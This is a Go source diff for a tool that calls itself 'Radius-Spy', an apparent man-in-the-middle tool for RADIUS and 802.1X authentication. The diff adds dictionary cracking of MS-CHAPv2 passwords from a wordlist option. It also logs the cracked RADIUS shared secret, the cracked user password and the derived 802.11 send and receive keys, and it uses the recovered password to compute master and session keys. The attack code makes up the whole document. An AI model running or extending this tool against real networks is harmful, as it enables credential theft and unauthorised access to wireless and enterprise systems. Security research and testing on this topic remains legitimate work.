@@ -216,6 +216,7 @@ func manglePacket(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.UD
 
 	if context.GetSecret() == "" { //No secret discovered
 		if ok, secret := attack.GuessSecret(manglePacket.Clone(), client, server, clientToServer); ok {
+			glog.V(0).Infoln("Secret cracked ", secret)
 			context.SetSecret(secret)
 		}
 	}
@@ -382,6 +383,13 @@ func manageNASPeap(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.U
 
 				//Derived Key obtained
 				context.SetDerivedKey(keyringMaterial)
+
+				glog.V(0).Infoln("802.11 Recv Key:")
+				glog.V(0).Infoln("\n" + hex.Dump(keyringMaterial[:32]))
+
+				glog.V(0).Infoln("802.11 Send Key:")
+				glog.V(0).Infoln("\n" + hex.Dump(keyringMaterial[32:64]))
+
 			}
 
 		}
@@ -733,27 +741,45 @@ func manageMsChapV2(packet *eap.EapMSCHAPv2, context *session.ContextInfo) {
 
 		calculatedResponse := eap.MsChapV2GenerateNTResponse(context.GetMsChapV2AuthChallenge(), context.GetMsChapV2PeerChallenge(), context.GetUserName(), "password")
 
-		glog.V(3).Infoln("Local NT-Response")
-		glog.V(3).Infoln("\n" + hex.Dump(calculatedResponse))
+		var ntResponseArray [24]byte
 
-		glog.V(2).Infoln("Calculating Master key")
+		copy(ntResponseArray[:], ntResponse)
 
-		masterKey := eap.MsChapV2GetMasterKeyFromPsswd("password", ntResponse)
+		if cracked, password := attack.GuessPasswordFromMsCHAPv2(context.GetMsChapV2AuthChallenge(), context.GetMsChapV2PeerChallenge(),
+			context.GetUserName(), ntResponseArray); cracked {
 
-		glog.V(3).Infoln("Calculated Master Key:")
-		glog.V(3).Infoln("\n" + hex.Dump(masterKey))
+			glog.V(0).Infoln("Password cracked: ", password)
+			context.SetPassword(password)
 
-		glog.V(2).Infoln("Calculating Send key")
+		}
 
-		sendKey := eap.MsChapV2GetSendKey(masterKey)
-		glog.V(3).Infoln("Calculated Send Key:")
-		glog.V(3).Infoln("\n" + hex.Dump(sendKey))
+		if context.GetPassword() != "" {
 
-		glog.V(2).Infoln("Calculating Receive key")
+			password := context.GetPassword()
 
-		receiveKey := eap.MsChapV2GetReceiveKey(masterKey)
-		glog.V(3).Infoln("Calculated Receive Key:")
-		glog.V(3).Infoln("\n" + hex.Dump(receiveKey))
+			glog.V(3).Infoln("Local NT-Response")
+			glog.V(3).Infoln("\n" + hex.Dump(calculatedResponse))
+
+			glog.V(2).Infoln("Calculating Master key")
+
+			masterKey := eap.MsChapV2GetMasterKeyFromPsswd(password, ntResponse)
+
+			glog.V(3).Infoln("Calculated Master Key:")
+			glog.V(3).Infoln("\n" + hex.Dump(masterKey))
+
+			glog.V(2).Infoln("Calculating Send key")
+
+			sendKey := eap.MsChapV2GetSendKey(masterKey)
+			glog.V(3).Infoln("Calculated Send Key:")
+			glog.V(3).Infoln("\n" + hex.Dump(sendKey))
+
+			glog.V(2).Infoln("Calculating Receive key")
+
+			receiveKey := eap.MsChapV2GetReceiveKey(masterKey)
+			glog.V(3).Infoln("Calculated Receive Key:")
+			glog.V(3).Infoln("\n" + hex.Dump(receiveKey))
+
+		}
 
 	case eap.MsChapV2Success:
 
@@ -766,10 +792,13 @@ func manageMsChapV2(packet *eap.EapMSCHAPv2, context *session.ContextInfo) {
 
 			//Calculate ourselves the result of the message field
 
-			calcMessage := eap.MsChapV2GenerateAuthenticatorResponse("password", context.GetMsChapV2NTResponse(),
-				context.GetMsChapV2PeerChallenge(), context.GetMsChapV2AuthChallenge(), context.GetUserName())
+			if context.GetPassword() != "" {
+				password := context.GetPassword()
+				calcMessage := eap.MsChapV2GenerateAuthenticatorResponse(password, context.GetMsChapV2NTResponse(),
+					context.GetMsChapV2PeerChallenge(), context.GetMsChapV2AuthChallenge(), context.GetUserName())
 
-			glog.V(2).Infoln("Calculated message:", calcMessage)
+				glog.V(2).Infoln("Calculated message:", calcMessage)
+			}
 
 		}
 
@@ -942,12 +971,13 @@ func updateContextFromPacket(context *session.ContextInfo, manglePacket *radius.
 func main() {
 
 	secrets := flag.String("secrets", "secrets.txt", "Secrets file to perform dictionary attacks")
+	passwords := flag.String("passwords", "passwords.txt", "Passwords file to perform dictionary attacks")
 
 	active := flag.Bool("active", false, "When activated, communications will be intercepted, otherwise, we only forward packets")
 
 	flag.Parse()
 
-	session.SetConfig(*secrets)
+	session.SetConfig(*secrets, *passwords)
 
 	glog.V(0).Infoln("Radius-Spy. Version", softVersion)
 
